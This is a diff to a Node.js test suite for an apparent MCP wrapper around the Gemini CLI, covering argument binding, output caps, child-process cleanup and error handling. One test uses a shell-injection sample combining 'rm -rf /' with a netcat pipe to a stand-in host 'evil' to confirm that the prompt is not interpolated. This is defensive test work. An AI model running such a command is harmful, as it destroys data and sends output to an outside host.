@@ -20,22 +20,22 @@ import {
 } from "../dist/invoke.js";
 import { makeFakeBin, withEnv } from "./helpers.mjs";
 
-test("buildArgv puts -p first and JSON output before approval mode", () => {
+test("buildArgv binds prompt values and enables trusted YOLO JSON mode", () => {
   const argv = buildArgv({ prompt: "hello" });
-  assert.equal(argv[0], "-p");
-  assert.equal(argv[1], "hello");
-  assert.equal(argv[2], "--output-format");
-  assert.equal(argv[3], "json");
-  assert.equal(argv[4], "--approval-mode");
-  assert.equal(argv[5], "yolo");
-  assert.equal(argv.length, 6, "no extra flags when model is omitted");
+  assert.equal(argv[0], "--prompt=hello");
+  assert.deepEqual(argv.slice(1), [
+    "--output-format",
+    "json",
+    "--skip-trust",
+    "--approval-mode",
+    "yolo",
+  ]);
 });
 
-test("buildArgv appends --model only when provided", () => {
+test("buildArgv appends a bound --model value only when provided", () => {
   const argv = buildArgv({ prompt: "hi", model: "gemini-2.5-pro" });
-  assert.equal(argv.includes("--model"), true);
-  const modelIdx = argv.indexOf("--model");
-  assert.equal(argv[modelIdx + 1], "gemini-2.5-pro");
+  const modelIdx = argv.indexOf("--model=gemini-2.5-pro");
+  assert.notEqual(modelIdx, -1);
   // model flag must come AFTER the core flags
   assert.ok(modelIdx > argv.indexOf("--approval-mode"));
 });
@@ -44,14 +44,25 @@ test("buildArgv passes the prompt as a single argv element — no shell interpol
   // A prompt containing shell metacharacters must come through as one element.
   const nasty = `; rm -rf / && echo "$(whoami)" \`id\` | nc evil 9999`;
   const argv = buildArgv({ prompt: nasty });
-  assert.equal(argv[1], nasty, "prompt must be exactly one argv element");
+  assert.equal(
+    argv[0],
+    `--prompt=${nasty}`,
+    "prompt must be bound inside exactly one argv element"
+  );
   // and nothing else in argv should contain those metacharacters
-  for (let i = 0; i < argv.length; i++) {
-    if (i === 1) continue;
+  for (let i = 1; i < argv.length; i++) {
     assert.ok(
       !argv[i].includes("rm -rf"),
       `argv[${i}] leaked prompt content`
     );
+  }
+});
+
+test("buildArgv prevents prompt values from becoming Gemini CLI flags", () => {
+  for (const prompt of ["--help", "--version", "-m"]) {
+    const argv = buildArgv({ prompt });
+    assert.equal(argv[0], `--prompt=${prompt}`);
+    assert.equal(argv.includes(prompt), false);
   }
 });
 
@@ -62,7 +73,13 @@ test("composePrompt wraps context in <context> when provided", () => {
 
 test("composePrompt is a no-op without context", () => {
   assert.equal(composePrompt({ prompt: "hi" }), "hi");
-  assert.equal(composePrompt({ prompt: "hi", context: "" }), "hi");
+});
+
+test("composePrompt preserves an explicitly empty context block", () => {
+  assert.equal(
+    composePrompt({ prompt: "hi", context: "" }),
+    "<context>\n\n</context>\n\nhi"
+  );
 });
 
 test("childEnv pins NO_COLOR=1 and TERM=dumb", () => {
@@ -96,6 +113,29 @@ test("invokeGemini returns a clear ENOENT result when the CLI is missing", async
     assert.match(r.text, /GEMINI_CLI_BIN/);
   });
 });
+
+test(
+  "invokeGemini returns input_validation when argv exceeds the OS limit",
+  {
+    skip:
+      process.platform === "win32"
+        ? "Windows reports command-line limits differently"
+        : false,
+  },
+  async () => {
+    const fake = makeFakeBin(`printf '{"response":"unexpected"}'`);
+    try {
+      await withEnv({ GEMINI_CLI_BIN: fake }, async () => {
+        const r = await invokeGemini({ prompt: "x".repeat(2 * 1024 * 1024) });
+        assert.equal(r.exitCode, 42);
+        assert.equal(r.errorKind, "input_validation");
+        assert.match(r.text, /too large.*process argument limit/i);
+      });
+    } finally {
+      try { fs.unlinkSync(fake); } catch {}
+    }
+  }
+);
 
 test("invokeGemini surfaces non-zero exit codes via classifyExitCode", async () => {
   const fake = makeFakeBin(`exit 1`);
@@ -132,7 +172,7 @@ test("invokeGemini caps stdout at GEMINICLI_MCP_MAX_OUTPUT_BYTES and kills the c
   }
 });
 
-test("invokeGemini actually passes --model to the spawned child", async () => {
+test("invokeGemini actually passes bound prompt and model options to the child", async () => {
   const captureFile = path.join(
     os.tmpdir(),
     `geminicli-mcp-argv-${process.pid}-${Date.now()}.json`
@@ -147,11 +187,11 @@ test("invokeGemini actually passes --model to the spawned child", async () => {
       await invokeGemini({ prompt: "hello", model: "gemini-2.5-flash" });
     });
     const argv = JSON.parse(fs.readFileSync(captureFile, "utf8"));
-    assert.ok(argv.includes("--model"), `--model not in argv: ${argv}`);
-    const modelIdx = argv.indexOf("--model");
-    assert.equal(argv[modelIdx + 1], "gemini-2.5-flash");
-    assert.equal(argv[0], "-p");
-    assert.equal(argv[1], "hello");
+    assert.ok(
+      argv.includes("--model=gemini-2.5-flash"),
+      `bound --model not in argv: ${argv}`
+    );
+    assert.equal(argv[0], "--prompt=hello");
   } finally {
     try { fs.unlinkSync(fake); } catch {}
     try { fs.unlinkSync(captureFile); } catch {}
@@ -451,6 +491,12 @@ test("tryParseJson falls back to line-by-line when whole-buffer parse fails", ()
   assert.deepEqual(parsed, { response: "line scan" });
 });
 
+test("tryParseJson recovers pretty-printed JSON after a diagnostic line", () => {
+  const input = 'gemini: using cached credentials\n{\n  "response": "pretty"\n}\n';
+  const parsed = tryParseJson(input);
+  assert.deepEqual(parsed, { response: "pretty" });
+});
+
 // --- resultFromOutcome extraction branches (AUDIT-TEST-001, VAL-REM-F13-001) ---
 
 test("resultFromOutcome extracts text from p.response field (VAL-REM-F13-001)", () => {
@@ -500,6 +546,40 @@ test("resultFromOutcome extracts text from p.error.message field (VAL-REM-F13-00
   assert.equal(r.text, "quota exceeded");
 });
 
+test("resultFromOutcome does not let an empty response mask a structured CLI error", () => {
+  const outcome = {
+    exitCode: 41,
+    stdout: '{"response":"","error":{"message":"credentials expired"}}',
+    stderr: "",
+  };
+  const r = resultFromOutcome(outcome);
+  assert.equal(r.exitCode, 41);
+  assert.equal(r.errorKind, "auth_required");
+  assert.equal(r.text, "credentials expired");
+});
+
+test("resultFromOutcome never reports aborted or truncated output as success", () => {
+  const aborted = resultFromOutcome({
+    exitCode: 0,
+    stdout: '{"response":"partial"}',
+    stderr: "",
+    aborted: true,
+  });
+  assert.equal(aborted.exitCode, 130);
+  assert.equal(aborted.errorKind, "cancelled");
+  assert.equal(aborted.aborted, true);
+
+  const truncated = resultFromOutcome({
+    exitCode: 0,
+    stdout: '{"response":"partial"}',
+    stderr: "",
+    truncated: true,
+  });
+  assert.equal(truncated.exitCode, 1);
+  assert.equal(truncated.errorKind, "error");
+  assert.equal(truncated.truncated, true);
+});
+
 test("resultFromOutcome falls back to raw stdout when JSON has no known field (VAL-REM-F13-001)", () => {
   const outcome = {
     exitCode: 0,
@@ -546,7 +626,7 @@ test("context prompt routing: prompt starts with <context> followed by a newline
     `geminicli-mcp-ctx-argv-${process.pid}-${Date.now()}.json`
   );
   // Fake bin captures its argv (excluding the shell script name at index 0)
-  // so we can inspect what was passed as the -p argument.
+  // so we can inspect what was passed as the bound --prompt value.
   const fake = makeFakeBin(
     `node -e 'require("fs").writeFileSync(${JSON.stringify(captureFile)}, JSON.stringify(process.argv.slice(1)))' -- "$@" ; printf '{"response":"ok"}'`
   );
@@ -555,9 +635,7 @@ test("context prompt routing: prompt starts with <context> followed by a newline
       await invokeGemini({ prompt: "summarize", context: "background info" });
     });
     const argv = JSON.parse(fs.readFileSync(captureFile, "utf8"));
-    // The -p argument is at index 1 (after the shell's `$0` has been stripped,
-    // node sees ["-p", "<prompt>", "--output-format", ...]).
-    const promptArg = argv[1];
+    const promptArg = argv[0].slice("--prompt=".length);
     assert.ok(promptArg.startsWith("<context>\n"), `prompt must start with <context>\\n, got: ${promptArg.slice(0, 40)}`);
   } finally {
     try { fs.unlinkSync(fake); } catch {}
@@ -664,6 +742,64 @@ test(
   }
 );
 
+test(
+  "output-cap termination does not orphan a descendant process",
+  {
+    skip:
+      process.platform === "win32"
+        ? "negative-PID process-group signalling is POSIX-only"
+        : false,
+    timeout: 30_000,
+  },
+  async () => {
+    const pidFile = path.join(
+      os.tmpdir(),
+      `geminicli-mcp-descendant-${process.pid}-${Date.now()}.pid`
+    );
+    const readyFile = `${pidFile}.ready`;
+    const fake = makeFakeBin(
+      // The descendant closes every inherited stdio stream. The direct child
+      // therefore emits `close` immediately after SIGTERM; process-group
+      // escalation still has to remain armed long enough to kill this orphan.
+      `sh -c 'trap "" TERM HUP; : > ${JSON.stringify(readyFile)}; exec </dev/null >/dev/null 2>&1; while :; do sleep 1; done' & printf '%s' "$!" > ${JSON.stringify(pidFile)}; while [ ! -e ${JSON.stringify(readyFile)} ]; do :; done; while :; do printf 'y'; done`
+    );
+    let descendantPid;
+    try {
+      await withEnv(
+        { GEMINI_CLI_BIN: fake, GEMINICLI_MCP_MAX_OUTPUT_BYTES: "64" },
+        async () => {
+          const r = await invokeGemini({ prompt: "hi" });
+          assert.equal(r.truncated, true);
+        }
+      );
+      descendantPid = Number(fs.readFileSync(pidFile, "utf8"));
+      assert.ok(Number.isSafeInteger(descendantPid) && descendantPid > 1);
+
+      let alive = true;
+      for (let attempt = 0; attempt < 150; attempt++) {
+        try {
+          process.kill(descendantPid, 0);
+        } catch (err) {
+          if (err?.code === "ESRCH") {
+            alive = false;
+            break;
+          }
+          throw err;
+        }
+        await new Promise((resolve) => setTimeout(resolve, 20));
+      }
+      assert.equal(alive, false, `descendant process ${descendantPid} survived`);
+    } finally {
+      if (Number.isSafeInteger(descendantPid) && descendantPid > 1) {
+        try { process.kill(descendantPid, "SIGKILL"); } catch {}
+      }
+      try { fs.unlinkSync(fake); } catch {}
+      try { fs.unlinkSync(pidFile); } catch {}
+      try { fs.unlinkSync(readyFile); } catch {}
+    }
+  }
+);
+
 // --- Invalid GEMINICLI_MCP_MAX_OUTPUT_BYTES falls back to default (AUDIT-TEST-011, VAL-REM-F14-005) ---
 
 test("invalid GEMINICLI_MCP_MAX_OUTPUT_BYTES 'abc' falls back to default cap (VAL-REM-F14-005)", async () => {
@@ -721,6 +857,47 @@ test("invalid GEMINICLI_MCP_MAX_OUTPUT_BYTES '' falls back to default cap (VAL-R
       assert.equal(r.text, "ok");
       assert.equal(r.truncated, undefined);
     });
+  } finally {
+    try { fs.unlinkSync(fake); } catch {}
+  }
+});
+
+test("partially numeric GEMINICLI_MCP_MAX_OUTPUT_BYTES falls back to the default", async () => {
+  const fake = makeFakeBin(
+    `node -e 'process.stdout.write(JSON.stringify({response:"x".repeat(256)}))'`
+  );
+  try {
+    await withEnv(
+      {
+        GEMINI_CLI_BIN: fake,
+        GEMINICLI_MCP_MAX_OUTPUT_BYTES: "64garbage",
+      },
+      async () => {
+        const r = await invokeGemini({ prompt: "hi" });
+        assert.equal(r.exitCode, 0);
+        assert.equal(r.text, "x".repeat(256));
+        assert.equal(r.truncated, undefined);
+      }
+    );
+  } finally {
+    try { fs.unlinkSync(fake); } catch {}
+  }
+});
+
+test("a SIGTERM-trapping child cannot turn capped output into a successful result", {
+  skip: process.platform === "win32" ? "SIGTERM cannot be trapped on Windows" : false,
+}, async () => {
+  const fake = makeFakeBin(`trap 'exit 0' TERM; while :; do printf 'x'; done`);
+  try {
+    await withEnv(
+      { GEMINI_CLI_BIN: fake, GEMINICLI_MCP_MAX_OUTPUT_BYTES: "64" },
+      async () => {
+        const r = await invokeGemini({ prompt: "hi" });
+        assert.notEqual(r.exitCode, 0);
+        assert.equal(r.errorKind, "error");
+        assert.equal(r.truncated, true);
+      }
+    );
   } finally {
     try { fs.unlinkSync(fake); } catch {}
   }
@@ -896,10 +1073,11 @@ test("npm test passes without GEMINICLI_MCP_DEBUG set (VAL-REM-F19-003)", async 
   }
 });
 
-test("killFailed is true when child.kill throws (VAL-FOLLOWUP-DOCS-CI-003)", { timeout: 7000 }, async () => {
+test("killFailed is true when process-tree signalling throws (VAL-FOLLOWUP-DOCS-CI-003)", { timeout: 7000 }, async () => {
   // Deterministically exercise the killFailed: true branch by overriding
-  // ChildProcess.prototype.kill to throw, then triggering truncation which
-  // calls killWith → child.kill("SIGTERM") → catch → killFailed = true.
+  // both process-group and direct-child signalling, then triggering
+  // truncation which calls killWith → signalChildTree("SIGTERM") → catch →
+  // killFailed = true.
   // The fake bin emits enough output to exceed the cap, then exits on its own
   // after 1s so the test cannot hang if the overridden kill prevents SIGTERM.
   const fake = makeFakeBin(
@@ -907,8 +1085,12 @@ test("killFailed is true when child.kill throws (VAL-FOLLOWUP-DOCS-CI-003)", { t
   );
 
   const origKill = ChildProcess.prototype.kill;
+  const origProcessKill = process.kill;
   ChildProcess.prototype.kill = function killOverride() {
     throw new Error("mock kill failure for test");
+  };
+  process.kill = function processKillOverride() {
+    throw new Error("mock process-group kill failure for test");
   };
 
   const origWrite = process.stderr.write.bind(process.stderr);
@@ -956,6 +1138,7 @@ test("killFailed is true when child.kill throws (VAL-FOLLOWUP-DOCS-CI-003)", { t
     );
   } finally {
     ChildProcess.prototype.kill = origKill;
+    process.kill = origProcessKill;
     process.stderr.write = origWrite;
     try {
       fs.unlinkSync(fake);
